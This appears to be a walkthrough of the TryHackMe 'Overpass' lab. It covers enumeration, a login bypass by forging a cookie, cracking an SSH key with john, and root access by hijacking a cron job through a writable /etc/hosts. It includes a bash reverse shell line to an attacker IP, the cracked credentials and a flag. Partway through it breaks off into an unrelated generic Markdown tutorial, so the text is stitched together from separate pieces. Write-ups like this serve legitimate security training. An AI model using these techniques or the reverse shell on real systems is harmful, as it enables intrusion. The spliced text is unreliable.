## Tryhackme Overpass

### Difficulty : easy

### Enumeration
first of all let's begin with an nmap scan of the traget ip 

***command***: ```nmap -sC -sV -Pn <ip address> ```

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/1.png)

here we can see that we have 2 ports open:
- ***Port 80 (http)***

- ***Port 22 (ssh)***

now lets begin with http. we head over to our browser to see what web service is running on it. 

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/2.png)

so we scroll through all the pages to see what we can attempt to exploit. on the about page, we come accross something interesting.
we can see a list of names for all staffs on the site. so lets put this in a text file and move on cus we might need it later.


![Markdown Logo](/home/d4rk5id3/Documents/Overpass/3.png)

on the top right corner of the page we can also see a downloads button which redirects us to a page to download the source code binaries of the overpass system.

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/4.png)

so looking at the source code didnt give us anything quite useful.

since this is a web application we can try to bruteforce for hidden directories on the server.

```gobuster dir -u http://<ip address>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ```

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/5.png)

we discovered some new directories, so lets check the out.
so from the ***/img*** directory we could only find images 

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/6.png)

moving unto the next lets check the ***/admin*** directory.


![Markdown Logo](/home/d4rk5id3/Documents/Overpass/7.png)

Great!! we discovered a login page to the administrator area.

so i tried some default credentials and SQli, but it didnt seem to work so now lets inspect the pages source code to see what we can find.


![Markdown Logo](/home/d4rk5id3/Documents/Overpass/8.png)

we can see a couple of javascript files 
- **main.js**
- **login.js**
- **cookie.js**

we can simply view them by using the developers tool in our browsers.

firstly let's view the ***main.js** file.


![Markdown Logo](/home/d4rk5id3/Documents/Overpass/9.png)

this just contains ***'hello world!'***.

next we check out ***login.js***.

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/10.png)

we can see a statement that creates a ***SessionToken cookie*** if the admin credentials supplied into the form are correct.

This part is cool. The "if" statement is checking if the response is "Incorrect Credentials." If it's true, it shows a message. If false, it sets a cookie called "SessionToken" to the statusOrCookie and sends the user to /admin. this it lets us add different cookie values, and hopefully, they'll work.

### Exploitation

for the exploitation we would be  making use of the debugger tool on our web browser to inspect and manually create our ***session token cookie*** and setting the value as statusOrCookie in the browser.

we go over to the storage tab and select cookie press the ```+``` by the right side of the tab and then edit name value to ```SessionToken``` then set the path to ```/```.

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/11.png)

with all this in place we can refresh the page. we can now see that we have gotten an RSA key.


![Markdown Logo](/home/d4rk5id3/Documents/Overpass/12.png)

now lets attempt cracking the RSA key. so we create a file called id_rsa, copy the key into the file and then save it. to make the file crackable by john we must make use of the ssh2john script using the following command.

```ssh2john id_rsa > id_rsa.hash```

we must change the permission using:  ```chmod 600 id_rsa``` .

now we can crack the RSA key using john. 

***command***: ```john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash```

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/13.png)

now we have successfully cracked the password.

***password***: ```james13```

Now since we know the username (james) and the RSA passphrase (james13) we can try to ssh using this command.

```
ssh -i id_rsa <ip address>


```

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/14.png)

and we are in. so the get the user flag we can just list the files in the current directory and then we can find the ***user.txt*** file which can be viewed using the following command.

```cat user.txt```

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/15.png)

***FLAG***: ```thm{65c1aaf000506e56996822c6281e6bf7}```

we have now successfully gained our first flag.

now in the same directory we can see a ```todo.txt```.

lets ```cat``` out the content.

```cat todo.txt```

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/16.png)

## Pivilege Escalation

ifwe attempt to view our files in our current directory, we can see that we have a hidden file called ```.overpass```. 

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/17.png)


let's cat out the content of the file.

```cat .overpass```

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/18.png)

so we can copy that and try to identify what encryption format that is.

***encryption***: ```,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.```

to identify the encrytion format, we can use use https://dcode.fr to do that.

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/19.png)

the encryption is rot47. we can decrypt using this same site.

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/20.png)

```
[{"name":"System","pass":"saydrawnlyingpicture"}]
```
so we can see that we have a username and password.

## Enumeration with Linpeas

we can start a python server on our local machine which would enable us to transfer linpeas file over to the target machine.

```
python3 -m http.server 9000
wget http://<ip_address>:9000/linpeas.sh
```

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/21.png)

now we can execute linpeas using the following commands:

```bash linpeas.sh | tee linpeas.out```

### Exploiting Cron jobs

so linpeas has  enumerated the entire system we can see that we have a cron job which runs as root and can be exploited to escalate our privileges to the ***root*** user.

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/24.png)

so by viewing the host file on our target machine we can see that overpass.thm points to localhost, the host file an be edited by all users on the system.


![Markdown Logo](/home/d4rk5id3/Documents/Overpass/25.png)

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/26.png)

This means the /etc/hosts entries could be modified to point overpass.htm at the local Kali machine and make the cron job execute arbitrary Bash scripts as root.

![Markdown Logo](/home/d4rk5id3/Documents/Overpass/27.png)


now we can create and make use of a simple bash reverse shell to get a connection back to our local machine.


```
bash -i >& /dev/tcp/10.18.73.117/4242 0>&1

```


![Markdown Logo](/home/d4rk5id3/Documents/Overpass/28.png)

next we shall setup a netcat listener on our local machine. which would connect to our reverse shell once the cronjob runs.

```
nc -lnvp <listening port>

```




























### This is a level 3 header

## Text Formatting

You can format text in various ways:

- **Bold text** can be created using `**double asterisks**` or `__double underscores__`.
- *Italic text* can be created using `*single asterisks*` or `_single underscores_`.
- ~~Strikethrough~~ text can be created using `~~double tildes~~`.
- `Inline code` can be created using backticks, like `inline code`.

## Lists

You can create ordered and unordered lists:

Unordered list:
- Item 1
- Item 2
  - Subitem 1
  - Subitem 2
- Item 3

Ordered list:
1. First item
2. Second item
3. Third item

## Links

You can create links like this: [OpenAI](https://www.openai.com/).

## Images

You can display images like this:

![Markdown Logo](https://markdown-here.com/img/icon256.png)

## Code Blocks

You can create code blocks using triple backticks:

```python
def greet(name):
    print(f"Hello, {name}!")
